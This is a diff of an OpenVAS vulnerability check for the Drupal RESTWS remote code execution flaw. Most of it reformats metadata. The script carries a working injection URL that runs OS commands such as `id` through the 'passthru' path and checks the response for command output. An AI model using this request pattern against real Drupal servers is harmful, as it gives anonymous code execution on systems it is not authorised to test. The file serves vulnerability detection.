@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_drupal_restws_rce_07_16.nasl 9437 2018-04-11 10:24:03Z cfischer $
+# $Id: gb_drupal_restws_rce_07_16.nasl 11614 2018-09-26 07:39:28Z asteins $
 #
 # Drupal RESTWS Remote Code Execution
 #
@@ -29,31 +29,31 @@ CPE = "cpe:/a:drupal:drupal";
 
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105817");
- script_version ("$Revision: 9437 $");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_oid("1.3.6.1.4.1.25623.1.0.105817");
+  script_version("$Revision: 11614 $");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
- script_name("Drupal RESTWS Remote Code Execution");
+  script_name("Drupal RESTWS Remote Code Execution");
 
- script_tag(name: "vuldetect" , value:"Try to ececute the `id` command");
- script_tag(name: "insight" , value:"The RESTWS module enables to expose Drupal entities as RESTful web services. RESTWS alters the default page callbacks for entities to provide additional functionality. A vulnerability in this approach allows an attacker to send specially crafted requests resulting in arbitrary PHP execution. There are no mitigating factors. This vulnerability can be exploited by anonymous users.");
- script_tag(name: "summary" , value:"The remote Drupal installation is prone to a remote code execution vulnerability.");
- script_tag(name:"solution_type", value: "VendorFix");
- script_tag(name: "solution" , value:"Install the latest version:");
+  script_tag(name:"vuldetect", value:"Try to ececute the `id` command");
+  script_tag(name:"insight", value:"The RESTWS module enables to expose Drupal entities as RESTful web services. RESTWS alters the default page callbacks for entities to provide additional functionality. A vulnerability in this approach allows an attacker to send specially crafted requests resulting in arbitrary PHP execution. There are no mitigating factors. This vulnerability can be exploited by anonymous users.");
+  script_tag(name:"summary", value:"The remote Drupal installation is prone to a remote code execution vulnerability.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"solution", value:"Install the latest version:");
 
- script_xref( name:"URL", value:"https://www.drupal.org/node/2765567");
+  script_xref(name:"URL", value:"https://www.drupal.org/node/2765567");
 
- script_tag(name:"qod_type", value:"exploit");
+  script_tag(name:"qod_type", value:"exploit");
 
- script_tag(name:"last_modification", value:"$Date: 2018-04-11 12:24:03 +0200 (Wed, 11 Apr 2018) $");
- script_tag(name:"creation_date", value:"2016-07-20 12:15:23 +0200 (Wed, 20 Jul 2016)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
- script_dependencies("drupal_detect.nasl", "os_detection.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("drupal/installed");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-26 09:39:28 +0200 (Wed, 26 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2016-07-20 12:15:23 +0200 (Wed, 20 Jul 2016)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
+  script_dependencies("drupal_detect.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("drupal/installed");
 
  exit(0);
 }
@@ -68,11 +68,13 @@ if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
+vt_string = get_vt_string(lowercase:TRUE);
+
 cmds = exploit_commands();
 
 foreach cmd ( keys( cmds ) )
 {
-  url = dir + '/index.php?q=taxonomy_vocabulary/openvas/passthru/' + cmds[cmd];
+  url = dir + '/index.php?q=taxonomy_vocabulary/' + vt_string + '/passthru/' + cmds[cmd];
   if( buf = http_vuln_check( port:port, url:url, pattern:cmd ) )
   {
     report = report_vuln_url( port:port, url:url );
